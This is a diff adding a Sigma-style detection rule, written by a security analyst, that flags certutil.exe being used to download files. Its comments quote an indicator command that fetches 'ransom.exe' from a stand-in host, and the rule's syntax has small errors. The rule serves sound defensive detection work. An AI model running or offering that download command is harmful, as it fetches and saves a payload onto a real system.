@@ -1,0 +1,36 @@
+#Certutil Download - Intel Analysis
+#IOC1 - Image: certutil.exe
+#IOC2 - CommandLine: certutil -urlcache -split -f http://huntmeplz.com/ransom.exe ransom.exe
+# The command certutil -urlcache -split -f http://huntmeplz.com/ransom.exe ransom.exe is used to download a file from a URL and save it to a local file. The -urlcache option tells certutil to download the file, and the -split option tells certutil to save the file in multiple parts. The -f option tells certutil to overwrite the existing file if it exists.
+
+#Rule Idenitfication
+title: Certutil Download
+status: experimental
+description: Detect the certutil tool download event from the URL
+author: Mirza Mansoor Ali Baig
+date: 30/01/2024
+#Log Source
+log source:
+     product: windows
+     category: process_creation
+#Detection Description
+detection:
+    selection:
+       EventID: 1
+       Image|endswith:
+       - '\certutil.exe'
+       CommandLine|Contains:
+       - '-urlcache'
+       - '-split'
+       - 'http://huntmeplz.com/ransom.exe'
+condition: selection
+#Rule Identification
+falsepositives:
+   - Legit admin using certutil to download files for testing purposes
+level:
+   - Medium
+references:
+   - https://attack.mitre.org/software/S0160/
+tags:
+   - attack.command_and_control
+   - attack.T1105
